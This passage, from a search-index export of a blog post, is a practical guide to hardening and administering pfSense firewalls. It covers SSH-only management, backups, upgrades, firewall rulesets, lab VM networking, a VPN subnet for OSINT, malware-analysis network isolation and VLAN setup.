public key based SSH for access.</p> <p>This above guidance is fairly generic and applies to any networking appliance.</p> <p>The steps below detail how to secure a pfSense device if it's also physically in an untrusted environment. Ultimately physical access means game over, but ideally you'd want to at minimum detect tampering. Everything under the recommended section attempts to require an adversary to either completely reset the device to factory defaults or open the case to gain access.</p> <p>Two areas this guide does not yet cover:</p> <ul> <li>Attacks leveraging USB ports</li> <li>Attacks against the network card itself</li> </ul>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#recommended-settings","title":"Recommended Settings","text":"<ul> <li>Require portforwarding over SSH to reach the WebGUI</li> <li>Delete the default <code>Anti-Lockout Rule</code><ul> <li>Create a firewall rule to allow inbound ssh access:<ul> <li>Protocol: TCP</li> <li>Source IP: *</li> <li>Source Port: *</li> <li>Destination IP: This Firewall</li> <li>Destination Port: <code>&lt;ssh-port&gt;</code></li> </ul> </li> <li>Be sure this rule is active on the LAN / management port so you do not lock yourself out when removing the default Anti-Lockout Rule</li> <li><code>System &gt; Advanced &gt; [x] Disable webConfigurator anti-lockout rule</code></li> <li> <p>Hint: the \"Set interface(s) IP address\" option in the console menu resets this setting as well.</p> </li> </ul> </li> <li>Limit private traffic on the LAN / management port to only SSH on the firewall itself<ul> <li>If a WAN cable is accidentally (or malicously) plugged in to the management interface, it's essentially the same attack surface as the WAN interface</li> <li>A management device connected to the LAN / management interface can still reach the public internet with a block rule for private addresses followed by a pass rule to any</li> <li>If you need to reach other internal hosts, use an SSH session on the firewall itself, or use the firewall as a <code>-J</code> jump proxy</li> </ul> </li> <li>Create a low-privileged user</li> <li>Password protect the serial console</li> <li>Fill the screws on the bottom of the device with paint / nail polish to detect tampering</li> <li>Review <code>system.log</code> for connection attempts to the physical ports while the device is unattended<ul> <li><code>Status &gt; System Logs &gt; System &gt; General</code></li> <li>Filter for '<code>rc.linkup</code>' in <code>message</code>, this will show when interfaces had ethernet connections made</li> <li>Other filters for this: <code>DEVD</code> and <code>Hotplug</code></li> <li>This is useful for determining attempted intrusion or tampering while traveling, if for example you decide to bring a pfSense device as a mobile router (the size of the SG-1100 makes this feasible)</li> </ul> </li> </ul>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#optional-settings","title":"Optional Settings","text":"<ul> <li>Set static ARP mappings to MAC addresses of only devices you trust / will use for management</li> <li>Only expose the SSH service on the management interface (lower priority, SSH is generally OK to be publicly facing)</li> <li>Firewall access to the SSH service by source IP (lower priority, especially if you don't always have a static source IP)</li> </ul> <p>Always confirm your settings with <code>nmap</code>:</p> <pre><code>nmap -n -Pn -sT -p- -e &lt;iface&gt; --open -T4 &lt;firewall-ip&gt;\nStarting Nmap 7.80 ( https://nmap.org ) at 2022-01-23 12:00 EDT\nNmap scan report for &lt;firewall-ip&gt;\nHost is up (0.0013s latency).\nNot shown: 65534 filtered ports\nSome closed ports may be reported as filtered due to --defeat-rst-ratelimit\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nNmap done: 1 IP address (1 host up) scanned in 87.72 seconds\n</code></pre> <p>This will use a TCP connect scan with normal user privileges to check all 65535 ports on the firewall. You want ssh to be the only service exposed.</p> <p>You should also try to reach other internal subnets from the managemnt interface with either <code>ping</code> or <code>nmap</code>.</p> <p>The <code>&lt;iface&gt;</code> in this case is the network interface on the device you're running the scan from, for example it could be <code>eth0</code> or <code>wlp1s0</code>.</p> <p>If a WAN cable connects to another internal LAN or OPT port, at minimum, most likely DNS and SSH are what will be reachable.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#backup-restore-configuration","title":"Backup / Restore Configuration","text":"<p>You will want to walk through a backup / restore process once you configure pfSense, to ensure your backup restores successfully and can be relied on. Do this before putting the device / VM into production.</p> <ol> <li> <p><code>Diagnostics &gt; Backup/Restore</code></p> </li> <li> <p>Set the Backup Area to All in the Backup Configuration section of the page.</p> </li> <li> <p>Set a password to encrypt the configuration xml file which may contain keys or secrets.</p> </li> <li> <p>Click <code>[Download]</code>.</p> </li> <li> <p>Save this file to external media and cloud storage, or to your password manager for example.</p> </li> </ol> <p>Later with the xml file present, restore the configuration from this page. Test this out before you rely on it.</p> <p>https://docs.netgate.com/pfsense/en/latest/backup/restore.html?highlight=restore#restoring-with-the-gui</p> <ol> <li> <p>After backing up the configuration, Navigate to <code>Diagnostics &gt; Factory Defaults</code></p> </li> <li> <p>Click <code>[Factory Reset]</code> then <code>[OK]</code></p> </li> <li> <p>After the reset which may take several minutes, walkthrough <code>Initial Setup</code> (see below)</p> </li> <li> <p><code>Diagnostics &gt; Backup/Restore</code>, select the areas to restore, the restore file on your local machine, and input the encryption password</p> </li> </ol> <p>Ensure everything is restored correctly.</p> <p>You can also restore from internal backups the firewall makes after any changes as well:</p> <p>https://docs.netgate.com/pfsense/en/latest/backup/restore.html?highlight=restore#restoring-from-the-config-history</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#upgrading","title":"Upgrading","text":"<p>Upgrade Guide:</p> <p>https://docs.netgate.com/pfsense/en/latest/install/upgrade-guide-update.html</p> <p>Upgrade Release Notes (for v2.4.5, but applies generally):</p> <p>https://www.netgate.com/blog/pfsense-2-4-5-release-now-available</p> <p>Important guidance included with every Release Note:</p> <p>Take a backup of the firewall configuration before applying any update.</p> <p>Do not update packages before upgrading! Either remove all packages or do not update packages before running the upgrade.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#upgrading-to-a-new-release","title":"Upgrading to a new release","text":"<p>Via the GUI:</p> <ul> <li> <p>Set <code>System &gt; Updates &gt; Branch</code> to the <code>Latest stable version</code></p> </li> <li> <p><code>Confirm</code></p> </li> </ul> <p>Via the console menu:</p> <ul> <li>Select option 13 (or select option 8 and run <code>pfSense-upgrade</code>)</li> </ul> <p>Via SSH with <code>sudo</code> / root:</p> <ul> <li>run <code>pfSense-upgrade</code></li> </ul>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#update-troubleshooting","title":"Update Troubleshooting","text":"<p>This page contains everything you'd need for troubleshooting various issues with updates and upgrades:</p> <p>https://docs.netgate.com/pfsense/en/latest/troubleshooting/upgrades.html</p> <p>Generally if obtaining the latest update fails, try the following:</p> <p>https://docs.netgate.com/pfsense/en/latest/troubleshooting/upgrades.html#upgrade-not-offered-library-errors</p> <p>Refresh the repository configuration and upgrade script by running the following commands from the console or shell:</p> <pre><code>pkg-static clean -ay; pkg-static install -fy pkg pfSense-repo pfSense-upgrade\n</code></pre> <p>If pfSense is unable to obtain an update status (the GUI update text under <code>Dashboard &gt; System Information &gt; Version</code> will be in red, or from the console you may see TLS verification fail when trying to reach netgate's servers)</p> <p>Closely adapted from: https://docs.netgate.com/pfsense/en/latest/troubleshooting/upgrades.html#rewrite-repository-information</p> <p>See the link above for additional guidance if these steps do not solve the issue.</p> <ul> <li> <p>Login via the GUI</p> </li> <li> <p>Set <code>System &gt; Updates &gt; Branch</code> to a <code>Previous stable version</code> (or <code>Latest developer snapshots</code>)</p> </li> <li> <p>Set <code>Branch</code> back to desired update target</p> </li> <li> <p>You should now see the update as available.</p> </li> </ul>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#ui-configuration","title":"UI Configuration","text":"<p>How to manage widgets: https://docs.netgate.com/pfsense/en/latest/monitoring/dashboard-manage.html</p> <p>Good widgets to have visible:</p> <ul> <li>System Information</li> <li>Interfaces</li> <li>Service Status</li> <li>Firewall Logs</li> <li>Gateways</li> </ul>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#networking","title":"Networking","text":"<p>Echoing what was referenced during the initial setup, to configure network interfaces:</p> <p>https://docs.netgate.com/pfsense/en/latest/config/interface-configuration.html</p> <p>TIP: When choosing a network address / range, choose something somwhat obscure that isn't likely to be a default configuration of an internal subnet. This is particularly important when bringing a small router / wireless device as a pfSense box on the go for travel.</p> <p>EXAMPLE: If you have an internal subnet of 192.168.20.0/24 on your pfSense device, and are connecting this device to a hotel LAN network that also has the same subnet, you will run into routing issues.</p> <p>Choosing something less typical, but still memorable can be done: <code>10.15.15.0/24</code>, <code>172.21.21.0/24</code>, <code>192.168.222.0/24</code>, etc...</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#updating-network-address-ranges","title":"Updating Network Address Ranges","text":"<p>TIP: To change the subnet of the management interface, avoid lockout and misconfiguration by temporarily permitting management access from another subnet or ensuring you have console access to use <code>2) Set interface(s) IP address</code></p> <p>TIP: update these values on an upstream bridged AP as well, either before or after, so long as it's not the same interface required for remotely managing the bridged AP device</p> <ul> <li>[x] <code>Services &gt; DHCP Server &gt; &lt;iface&gt;</code> Uncheck 'Enable DHCP server on ' <li>[x] <code>Interfaces &gt; &lt;iface&gt;</code> Change the IP address and range values</li> <li>[x] <code>Save</code> and <code>Apply</code></li> <li>[x] <code>Services &gt; DHCP Server &gt; &lt;iface&gt;</code> Update the <code>Range</code> values to reflect the new IP range, and re-check 'Enable DHCP server on ' <li>[x] <code>Save</code> and <code>Apply</code></li>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#aliases","title":"Aliases","text":""},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#networks","title":"Networks","text":"<p>Create an alias list for private RFC1918 or RFC3330 networks to use in rules for subnet isolation. Otherwise vlans can still reach other vlans if they aren't firewalled.</p> <p>https://www.iana.org/assignments/ipv4-address-space/ipv4-address-space.xhtml</p> <p>https://www.iana.org/assignments/ipv6-address-space/ipv6-address-space.xhtml</p> Address Block Present Use Reference 0.0.0.0/8 \"This\" Network [RFC1700, page 4] 10.0.0.0/8 Private-Use Networks [RFC1918] 14.0.0.0/8 Public-Data Networks [RFC1700, page 181] 24.0.0.0/8 Cable Television Networks -- 39.0.0.0/8 Reserved but subject to allocation [RFC1797] 127.0.0.0/8 Loopback [RFC1700, page 5] 128.0.0.0/16 Reserved but subject to allocation -- 169.254.0.0/16 Link Local -- 172.16.0.0/12 Private-Use Networks [RFC1918] 191.255.0.0/16 Reserved but subject to allocation -- 192.0.0.0/24 Reserved but subject to allocation -- 192.0.2.0/24 Test-Net 192.88.99.0/24 6to4 Relay Anycast [RFC3068] 192.168.0.0/16 Private-Use Networks [RFC1918] 198.18.0.0/15 Network Interconnect Device Benchmark Testing [RFC2544] 223.255.255.0/24 Reserved but subject to allocation -- 224.0.0.0/4 Multicast [RFC3171] 240.0.0.0/4 Reserved for Future Use [RFC1700, page 4] ::1 Loopback [RFC4291, page 6] fc00::/7 Unique Local Address (Global scope) [RFC4193, page 3] fe80::/10 Link-Scoped Unicast [RFC4291, page 6] ff00::/8 Multicast [RFC4291, page 6] <p>https://datatracker.ietf.org/doc/html/rfc3330#section-3</p> <p>Example of RFC 3330 as an alias:</p> <p></p> <p>Correctly configured routing devices should NOT forward fe80:: / link-scoped unicast traffic by default, meaning that local traffic should only happen locally. It allows your edge device to talk to the ISP's gateway device, but the ISP's gateway device will not be able to to talk to your internal machines on fe80::, however if you have a globally routable IPv6 address, the address and that interface it's bound to are globally routable.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#alias-ports","title":"Alias Ports","text":"<p>It can be helpful to create an alias for all of the ports management interfaces use.</p> <ul> <li>22/tcp  | SSH</li> <li>80/tcp  | HTTP WebGUI</li> <li>443/tcp | HTTPS WebGUI</li> </ul> <p>Of course if you changed any these from their defaults, maintaining them here makes it easy to maintain egress rules.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#firewall","title":"Firewall","text":"<p>Firewall rules and examples.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#essential-interfaces-wan-lan-floating","title":"Essential Interfaces (WAN, LAN, FLOATING)","text":"<pre><code>FLOATING\n    * [Optional] Reject outbound RFC1918/3330 traffic over the WAN\n    * &lt;https://docs.netgate.com/pfsense/en/latest/recipes/rfc1918-egress.html#steps-to-block-rfc-1918-traffic-from-leaving-the-wan-interface&gt;\n    NOTE: This covers the use case of routing over a VPN, if the VPN goes down private network taffic\n          will not leave the WAN interface.\n</code></pre> <pre><code>WAN\n    * Block private networks\n    * Block bogon networks\n    * [Optional] Allow ssh/tcp -&gt; WAN interface (whichever port is ssh, this allows ssh tunneling to the\n      web interface without exposing it)\n    * [Optional] Allow vpn traffic -&gt; X interface (permit remote access to networks, as well as secure\n      routing capability back out through the WAN using the vpn's dns server + firewall)\n</code></pre> <pre><code>LAN / Management Interface\n    * Anti-Lockout Rule | Allow to specific management ports on this interface (ie; 22, 443 only, etc)\n    * [Optional] Allow to other internal interfaces for management from this one subnet\n    * Disable the 'default allow outbound' rules here to keep this management interface\n      entirely offline, which is ultimately optional but recommended.\n</code></pre> <p>https://docs.netgate.com/pfsense/en/latest/recipes/rfc1918-egress.html</p> <p>https://docs.netgate.com/pfsense/en/latest/firewall/rule-methodology.html#block-private-networks</p> <p>NOTE: This suggests that the 'Block private address ranges' rule will break functionality when pfsense is behind another router</p> <p>(ie; a pfSense vm at 192.168.20.18 bridged to a real network, 192.168.20.0/24)</p> <p>This has not happened so far, however if it breaks DHCP, DNS, or other local routing, disable it and review.</p> <p>So far it only effects inbound traffic, which is fine if ssh access from the WAN interface is not required.</p> <p>TIP: You'll note <code>Block</code> and <code>Reject</code> are mentioned explicitly in the rules below. From an internal perspective, this makes the firewall rules less obvious.</p> <ul> <li>EXAMPLE 1<ul> <li>pfSense typically rejects on closed ports.</li> <li>If you only Block your management ports, Scanning all 65535 ports on the firewall will reveal exactly which are your management ports</li> </ul> </li> <li>EXAMPLE 2<ul> <li>Say you decide to scan ports on a specific IP chosen at random (172.20.111.72) within your current network (172.20.111.0/24)</li> <li>If no host exists, this will return as 'filtered'.</li> <li>Note that it can return filtered if the host exists and is dropping packets, but for the sake of this example, we know there is no host there.</li> <li>When Reject rules are in place to isolate neighboring RFC1918/3330 subnet ranges, any IP address in all neighboring private subnets will immediately return 'closed' for any ports scanned.</li> <li>When they do not return 'filtered' as the they would if there was no host at that IP, it becomes obvious you're firewalling neighboring subnets.</li> </ul> </li> </ul>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#example-firewall-rulesets","title":"Example Firewall Rulesets","text":""},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#optx-subnet-egress","title":"OPTx (Subnet egress)","text":"<pre><code>    * Block bogon networks\n    * Reject -&gt; management access\n    * [Optional] Deny IPv6\n    * Allow ICMP req -&gt; OPTx\n    * Allow tcp/udp-&gt; OPTx interface (Dns, DHCP, etc)\n    * [Optional] Block -&gt; RFC1918/3330 traffic (isolate subnets, else reachable)\n    * OPTx Net -&gt; Any ICMP req (allow all outbound ICMP ping request)\n    * OPTx Net -&gt; Any tcp/udp (allow all outbound routing of tpc/udp traffic)\n</code></pre>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#alternate-optx-strict-egress","title":"Alternate OPTx (Strict egress)","text":"<pre><code>    * Block bogon networks\n    * Reject -&gt; management access\n    * [Optional] Deny IPv6\n    * Allow ICMP req -&gt; OPTx\n    * Allow udp/53 -&gt; OPTx interface (Dns, DHCP, ping, etc)\n    * Block -&gt; RFC1918/3330 traffic (isolate subnets, else reachable)\n    * OPTx Net -&gt; Any ICMP req (allow all outbound ICMP ping request)\n    * OPTx Net -&gt; Any tcp/80 (Standard outbound http)\n    * OPTx Net -&gt; Any tcp/443 (Standard outbound https)\n    * OPTx Net -&gt; Any udp/123 (Standard outbound ntp)\n</code></pre>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#analysis-network-reject-all-traffic","title":"Analysis Network (Reject all traffic)","text":"<pre><code>    * Block bogon networks\n    * [Optional] Reject ANY -&gt; ANY\n</code></pre> <p>NOTE: Rejecting <code>ANY -&gt; ANY</code> will still allow Zeek to capture this traffic on the defined <code>SPAN</code> port if the analysis network interface is a member of the <code>BRIDGEx</code> interface. It will also still permit hosts to receive a DHCP lease from the pfSense firewall, be reachable with ping from the pfSense firewall, and for hosts to commnuicate with eachother internally, but no traffic can enter or leave this network. Rejecting <code>ANY -&gt; ANY</code> is not truly necessary, for example simply not having any rules will achieve a similar outcome. The difference is this rule is defined, and any outbound connections will be closed immediately instead of left to time out.</p> <p></p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#pfsense-as-a-lab-vm","title":"pfSense as a Lab VM","text":"<p>You'll want to review the documents for VMware and VirtualBox on how they describe lan segments:</p> <ul> <li> <p>VMware</p> <ul> <li>https://docs.vmware.com/en/VMware-Workstation-Pro/16.0/com.vmware.ws.using.doc/GUID-CC791418-B30C-487D-8F57-E7E855B61549.html</li> </ul> </li> <li> <p>VirtualBox</p> <ul> <li>https://www.virtualbox.org/manual/UserManual.html#network_internal</li> </ul> </li> </ul> <p>The key is this type of networking is entirely separate from the host's phyiscal network card.</p> <p>pfSense is leveraged here to be both the local subnet management system, and a way to control traffic flow, keeping your LAN segments entirely virtual and providing the subnets with outbound network access that require it.</p> <p>There's a lot of flexibility with this setup, the next steps cover the main details.</p> <p>This example will you give you a general purpose lab VM with the following isolated subnets (you can use the example rulesets above in these subnets):</p> <ul> <li>LAN / management network</li> <li>OPT1 / trusted network (work machines, local networking)</li> <li>OPT2 / untrusted network (lab machines, potentially untrusted local traffic)</li> <li>OPT3 / analysis network (no routing, no inbound, no outbound)</li> <li>[Optional] SPAN0 / port mirroring network interface</li> </ul> <p></p> <p>On VMWare Workstation, under <code>VM &gt; Settings &gt; Hardware</code> you'll want to have 6 network adaptors:</p> Device Summary Details Network Adapater Bridged (Automatic) Bridged, connected directly to the physical network (This will act as your WAN) Network Adapater 2 LAN Segment LAN Segment 1, effectively your LAN or management interface Network Adapater 3 LAN Segment LAN Segment 2, this will appear as OPT1 under interfaces, your trusted network Network Adapater 4 LAN Segment LAN Segment 3, this will appear as OPT2 under interfaces, your untrusted network Network Adapater 5 LAN Segment LAN Segment 4, this will appear as OPT3 under interfaces, your analysis (offline) network Network Adapater 6 LAN Segment LAN Segment 5, this will appear as OPT4 under interfaces, you'll want to assign this as your SPAN port <p></p> <p></p> <p>On VirtualBox, we are limited to 4 total network interfaces per VM.</p> <p>However we can still achieve similar usage with the following setup, under <code>VM &gt; Settings &gt; Network</code>:</p> Adapter Summary Details Adapter 1 Bridged Adapter Bridged, connected directly to the physical network (This will act as your WAN) Adapter 2 Internal Network You can name these anything, we'll use <code>pf-intnet-1</code> here, effectively your LAN or management interface Adapter 3 Internal Network You can name these anything, we'll use <code>pf-intnet-2</code> here, this will appear as OPT1 under interfaces, your trusted network Adapter 4 Internal Network You can name these anything, we'll use <code>pf-intnet-3</code> here, this will appear as OPT2 under interfaces, your untrusted network <p>While we're limited, we have flexibility in what to do next. I've found the following solutions work, choose whichever one you think is best:</p> <ul> <li>SOLUTION 1: Configure Zeek to listen on the 'trusted' and 'untrusted' networks</li> <li>Zeek can be configured to listen to two network interfaces.</li> <li>Instead of using a SPAN port, set it to your two networks that allow outbound traffic.</li> <li> <p>If you need an analysis subnet, simply switch over to the LAN / management interface, and turn off the firewall rules to pass outbound traffic in your untrusted network.</p> </li> <li> <p>SOLUTION 2: Merge your <code>LAN</code> management interface with the <code>OPT1</code> trusted subnet, essentially allow admin access via the trusted subnet</p> </li> <li>Trusted + management network</li> <li>Untrusted network</li> <li>Analysis network</li> </ul> <p>Don't forget you can also clone these VM's, and run pfSense behind pfSense. Despite the limitation in network adapters, the possibilities are somewhat limitless.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#pfsense-lab-vm-for-osint","title":"pfSense Lab VM for OSINT","text":"<p>Taking the above examples, you could dedicate a network interface to OSINT, following the setup recommended in Open Source Intelligence Techniques. This will replicate everything done on phyiscal hardware, such as the VPN + kill switch, only here you can manage and experiment with all of this virtually.</p> <p>They key points to remember no matter what kind of VPN client you setup:</p> <ul> <li>If you're dedicating a subnet to run behind the VPN, be sure you've added a network interface as a LAN segment to the pfSense VM ahead of time</li> <li>Add the VPN CA to your cert manager</li> <li>Add the VPN client profile<ul> <li>Don't pull routes</li> <li>Don't pull DNS if you want to use pfSense for DNS over TLS / HTTPS</li> <li>Refuse any non-stub compression</li> <li>If your VPN service profiles share a common CA and TLS key, you can configure a single profile to connect to random endpoints<ul> <li>Add one IP / port pair to the Endpoint Configuration section as normal</li> <li>Add the other IP / port pairs to Advanced Configuration &gt; Custom Options, one per line, starting with \"remote\", ending with a semicolon, like: <code>remote &lt;ip-address&gt; &lt;port&gt;;</code></li> <li>Add <code>remote-random;</code> to the Advanced Configuration &gt; Custom Options</li> <li>Each time you restart the OpenVPN service, it will connect to a new endpoint</li> </ul> </li> </ul> </li> <li>Interfaces &gt; Assignments &gt; Add the new OVPN interface you just created and named</li> <li>Here you'd also add the interface and DHCP server details for the dedicated subnet, just as described in network interfaces</li> <li>Configure manual outbound NAT, set the default gateway to the OVPN interface you just created and named for both outbound mappings<ul> <li>You want to add the one you named, and not the default virtual interface of 'OpenVPN' which is listed if OpenVPN is connected and running</li> </ul> </li> <li>Firewall &gt; Rules &gt; Set any rules you require, be sure the default outbound rule has the OVPN interface you just created and named set as it's default gateway (do this under Advanced)</li> <li>Once done, be sure to refresh the connection under Status &gt; OpenVPN &gt; Restart openvpn Service</li> <li>Use a VM in that subnet (Kali live works well here) to check your public IP with <code>curl https://ipinfo.io/ip</code></li> <li>SSH into the pfSense VM, setup a listener to review DNS traffic for leaks with <code>sudo tcpdump -i em0 -n -vv -Q out port 53 -Z nobody</code></li> <li>Make requests from that subnet to review the packet capture</li> </ul> <p>To review your configuration:</p> <ul> <li>Status &gt; OpenVPN &gt; Client Instance Statistics shows \"Connected (Success)\"</li> <li>On the same page, \u21bb restarting the client will cycle through IP addresses</li> <li><code>curl https://ipinfo.io/ip</code></li> <li>Visit <code>https://bgp.he.net/</code> from any browser within the subnet</li> <li>Start with Status &gt; System Logs &gt; OpenVPN if you're encountering any issues</li> </ul> <p>The easiest and safest way to manage this connection from the host is by bridging the \"WAN\" side of the pfSense VM so that you can SSH port forward to hit the web interface like this: <code>ssh -p &lt;port&gt; -L 127.0.0.1:8443:127.0.0.1:443 &lt;user&gt;@&lt;pfsense-ip&gt;</code>. Browsing to <code>https://127.0.0.1:8443</code> on your host will take you to the pfSense web interface. Here you can monitor the connection as well as cycle and change endpoints by restarting the OpenVPN client. This is ideal over making the VPN connection from your host whether it's through the built in <code>openvpn</code> package on Linux, or a VPN service's client application. In both cases you avoid putting your host into the same subnet as the VPN, and in the latter you avoid installing additional software.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#pfsense-lab-vm-for-networking","title":"pfSense Lab VM for Networking","text":"<p>Similarly, to do network testing you could network two or more additional pfSense systems behind a single 'main' pfSense VM, to communicate with each other. This will allow you to quickly spin up networking configurations and utilities, that generally work best across mutliple subnets and routes.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#malware-analysis-network-isolation","title":"Malware Analysis Network Isolation","text":"<p>This is critical for an internal and isolated malware analysis subnet, where you do not want anything reaching the world outside of that virtual network.</p> <p>This set of checks was learned from Practical Malware Analysis &amp; Triage which provides more detailed video walkthroughs of what to do and what to check. The accompanying Discord server also has more information on this topic. This section was heavily shaped from these two sources.</p> <p>The key to network isolation is ensuring the VM's doing the analysis are only connected to this one network interface and no others.</p> <p>First, be sure you've seen and configured the analysis subnet like the example above</p> <p>Then you can test internal and outbound connectivity from your analysis workstation:</p> <ul> <li> <p>Obtain local network information on Windows: <code>ipconfig</code></p> </li> <li> <p>Obtain local network information on Linux: <code>ip a</code></p> </li> <li> <p>Ping the local gateway</p> </li> <li> <p>Ping a publicly reachable address (we'll use Quad9's public DNS server): <code>ping 9.9.9.9</code></p> </li> </ul> <p>You should receive a Request timed out. response and see (100% loss) in your command output like below:</p> <p></p> <p>To be exhaustive, ensure DNS cannot be resolved:</p> <p>On Windows:</p> <pre><code>nslookup.exe microsoft.com &lt;dns-server&gt;\n</code></pre> <p>On Linux:</p> <pre><code>dig @&lt;dns-server&gt; microsoft.com\n</code></pre> <p>All of these should fail / timeout, like the example above.</p> <p>Next, you can check to see if the firewall itself can in fact reach internal hosts - it should never need to do this but it's one direction you can check to ensure for example DHCP leases can be sent out.</p> <p></p> <p>Last and most important, you'll want to check from another internal host that internal machines can talk to eachother, but again not anything else:</p> <ul> <li>This example pings the Windows 11 workstation from the previous example, at <code>172.20.133.100</code></li> <li>The gateway is ping'd again at <code>172.20.133.1</code> to ensure it doesn't respond</li> <li>The gateway is also checked with <code>nmap</code> to ensure the web interface is unreachable.</li> </ul> <p></p> <p>From here you're ready to test or analyze malware as far as the network configuration goes. Remember to also disable Drag &amp; Drop + Copy &amp; Paste and take a snapshot before detonation.</p> <p>Anytime you need to retreive new samples, or update an analysis workstation, simply roll back to the known-good snapshot, connect to a subnet that permits outbound traffic, run the updates and/or download the latest samples, then switch the network connection back to the analysis subnet before taking a new snapshot.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#nat","title":"NAT","text":"<p>Outbound NAT Mode: <code>Automatic</code> is fine in most cases <code>Manual</code> can be used to enforce subnets to use specific routes (ie; vpn killswitch, traffic shaping)</p> <p>TO DO</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#vpn","title":"VPN","text":"<p>Server Configuration:</p> <p>https://docs.netgate.com/pfsense/en/latest/recipes/openvpn-s2s-route-internet-traffic.html</p> <p>This guide routes all traffic through, and out of, a single site.</p> <ul> <li> <p>Good for traffic inspection</p> </li> <li> <p>Good for personal vpn usage (connect back to a trusted network)</p> </li> </ul> <p>Client Configruation:</p> <p>Be sure to check <code>Don't pull routes</code> (prevents the server from manipulating the local routing table)</p> <p>Also choose <code>[Refuse] Allow Compression</code> (don't allow any tunnel compression)</p> <p><code>IPv4 Tunnel Network</code>: Set this network range to a private range not in use by any live interfaces on the router, or allow the server to handle this and do not set any interfaces to ip ranges the server uses.</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#vlans","title":"VLANs","text":"<p>A logical splitting of a physical port into other virtual ports</p> <p>Represented as:</p> <p><code>eth0</code> -&gt; <code>eth0.10</code>, <code>eth0.20</code>, <code>eth0.30</code>...</p>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#creating-a-vlan-checklist","title":"Creating a VLAN Checklist:","text":"<ul> <li><code>VLAN ID</code> created under <code>Interfaces &gt; Assignments &gt; VLANs</code></li> <li>If applicable, <code>VLAN ID</code> also created under <code>Interfaces &gt; Switches &gt; VLANs</code><ul> <li>This is necessary on devices such as the SG-1100, or devices leveraging a single network interface with multiple ports already separated logically by VLANs</li> <li>For example, the SG-1100 will end up with double tagged VLANs if you're applying your own tags for an upstream switch / AP<ul> <li>This device is already separating traffic logically on a single interface with VLANs to create a LAN / WAN / OPT</li> <li>In other words, they're already tagged</li> <li>You're applying your own VLAN tags on top of these to isolate subnets on an upstream wireless access point, or managed switch.</li> </ul> </li> </ul> </li> <li>VLAN interfaces are enabled and defined within <code>Interfaces &gt; Assignments &gt; [vlan-interface]</code></li> <li><code>Interfaces &gt; [vlan-interface]</code>, <code>[x] Enable Interface</code><ul> <li>Optionally rename it from <code>OPTx</code></li> <li>Configure IPv4|6 + other settings</li> <li>Set interface's IPv4 static address + netmask</li> <li>Block bogon networks (always)</li> <li>Set a switch port this interface should map to<ul> <li>In the case of the SG-1100, this can be left alone.</li> <li>For the SG-3100, you can use this to logically separate the 4 LAN ports into isolated VLAN subnets</li> </ul> </li> <li><code>Save</code> + <code>Apply</code> when done.</li> </ul> </li> <li>DHCP enabled for desired VLANs under <code>Services &gt; DHCP Server &gt; [vlan-interface]</code><ul> <li>Here you can configure <code>Deny unkown clients</code> and <code>Static ARP</code> entries. This is useful for correlating traffic logs to IP addresses + MAC addresses</li> <li><code>Save</code> when done</li> </ul> </li> <li>All VLAN interface(s) configured so far should be visible on the Dashboard like any other interface</li> <li>Assign firewall rules to VLANs like any other interface</li> <li>Provision networking, and tag, upstream switches / Bridged AP's with the desired VLAN tags<ul> <li>Bridged AP's must support, and be in, bridged mode to allow the pfSense firewall to manage clients, dhcp, etc</li> </ul> </li> </ul>"},{"location":"blog/2024/05/02/simple-pfsense-pfsense-administration/#creating-a-vlan-detailed-steps","title":"Creating a VLAN - Detailed Steps:","text":"<p><code>Interfaces &gt; Assignments</code></p> <p>pfSense Interfaces and VLAN Assignments.</p> <p>Enable any VLANs you created in <code>Interfaces &gt; Assignments &gt; VLANs</code> here.</p> <p>EXAMPLE:</p> <ul> <li>WAN  = net2</li> <li>LAN  = net1</li> <li>OPT1 = net0</li> <li>OPT2 = VLAN 20  on net0 / OPT1  <li>OPT3 = VLAN 30  on net0 / OPT1  <li>LAN2 = VLAN 200 on net1 / LAN  <p>TO DO: add screenshots showing what this looks like in the WebGUI</p> <p><code>Interfaces &gt; Assignments &gt; VLANs</code></p> <p>This is where both upstream and local VLAN tags are described.</p> <p>You won't need to define upstream VLANs under <code>Interfaces &gt; Switches &gt; VLANs</code>, only VLANs on the local physical switch are defined there (Exception being the SG-1100 style chipsets, see below)</p> <p>Remember to enable these under <code>Interfaces &gt; Assignments</code>.</p> <p>EXAMPLE:</p> <p>Assign 3 VLANs to the <code>net0</code> interface, that an upstream Bridged AP will be aware of and using:</p> <pre><code>Parent Interface: net0\nVLAN Tag: 110\nDescription: VLAN1\n\nParent Interface: net0\nVLAN Tag: 120\nDescription: VLAN2\n\nParent Interface: net0\nVLAN Tag: 130\nDescription: VLAN3\n</code></pre> <ul> <li> <p><code>Interfaces &gt; Assignments &gt; [interface]</code></p> </li> <li> <p>Here again <code>Switch Port</code> is only relevant for ports on the local physical switch built into the device.</p> </li> <li> <p>Upstream VLANs won't be assigned a <code>Switch Port</code></p> </li> <li> <p>Enable the inerface like any other.</p> </li> <li> 